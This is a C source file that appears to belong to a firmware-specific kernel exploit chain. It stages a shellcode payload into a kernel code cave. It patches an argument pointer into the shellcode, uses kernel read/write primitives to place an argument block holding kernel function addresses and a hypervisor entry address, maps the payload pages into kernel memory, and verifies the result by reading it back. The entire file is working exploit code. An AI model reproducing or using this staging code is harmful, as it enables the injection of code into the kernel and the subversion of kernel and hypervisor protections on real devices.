#include "prepare_0250.h"
#include "../shellcode_kernel_0250/shellcode_kernel_0250.h"
#include "../shellcode_kernel_0250/shellcode_kernel_args.h"
#include "config_0250.h"
#include "staging_0250.h"
#include "utils.h"
#include <sys/mman.h>

#define ARGS_MARKER 0x11AA11AA11AA11AAULL

static int set_args_pointer(void *stage, size_t size, uint64_t args) {
  size_t offset = 0;
  unsigned int matches = 0;

  for (size_t i = 0; i + sizeof(uint64_t) <= size; i++) {
    uint64_t value;
    memcpy(&value, (uint8_t *)stage + i, sizeof(value));
    if (value == ARGS_MARKER) {
      offset = i;
      matches++;
    }
  }
  if (matches != 1 || offset >= 0x80)
    return -1;
  memcpy((uint8_t *)stage + offset, &args, sizeof(args));
  return 0;
}

static uint64_t prepare_args(void) {
  uint64_t entry_pa =
      staging_0250_kernel_pa(ktext + kernel_hv_entry_cave_offset);
  uint64_t page = staging_0250_alloc_page();
  if (!entry_pa || (entry_pa & 0xFFF) || entry_pa >= (1ULL << 40) || !page)
    return 0;

  shellcode_kernel_args args = {
      .fw_version = fw,
      .ktext = ktext,
      .dmap_base = dmap,
      .fun_smp_rendezvous = ktext + env_offset.FUN_SMP_RENDEZVOUS,
      .fun_smp_no_rendevous_barrier =
          ktext + env_offset.FUN_SMP_NO_RENDEVOUS_BARRIER,
      .g_vbios = ktext + env_offset.G_VBIOS,
      .linux_info_va = linux_i.linux_info,
      .hv_entry_cave_pa = entry_pa,
  };
  uint64_t args_va = dmap + page;
  kernel_copyin(&args, args_va, sizeof(args));

  shellcode_kernel_args readback = {0};
  if (kernel_copyout(args_va, &readback, sizeof(readback)) ||
      memcmp(&args, &readback, sizeof(args)))
    return 0;
  return args_va;
}

int prepare_kernel_stage_0250(void) {
  if (!shellcode_kernel_0250_bin_len ||
      shellcode_kernel_0250_bin_len > kernel_stage_budget)
    return -1;

  size_t mapped_size = ALIGN_UP(shellcode_kernel_0250_bin_len, PAGE_SIZE);
  void *stage = mmap(NULL, mapped_size, PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (stage == MAP_FAILED)
    return -1;

  size_t stage_size = shellcode_kernel_0250_bin_len;
  memcpy(stage, shellcode_kernel_0250_bin, stage_size);
  uint64_t args = prepare_args();
  if (!args || set_args_pointer(stage, stage_size, args))
    return -1;

  for (size_t offset = 0; offset < mapped_size; offset += PAGE_SIZE) {
    uint64_t pa = staging_0250_user_pa((uint64_t)stage + offset);
    if (!pa || staging_0250_map(kernel_cave_shellcode + offset, pa))
      return -1;
  }
  if (staging_0250_flush())
    return -1;

  uint8_t readback[256];
  for (size_t offset = 0; offset < stage_size; offset += sizeof(readback)) {
    size_t chunk = stage_size - offset;
    if (chunk > sizeof(readback))
      chunk = sizeof(readback);
    if (kernel_copyout(kernel_cave_shellcode + offset, readback, chunk) ||
        memcmp(readback, (uint8_t *)stage + offset, chunk))
      return -1;
  }
  return 0;
}
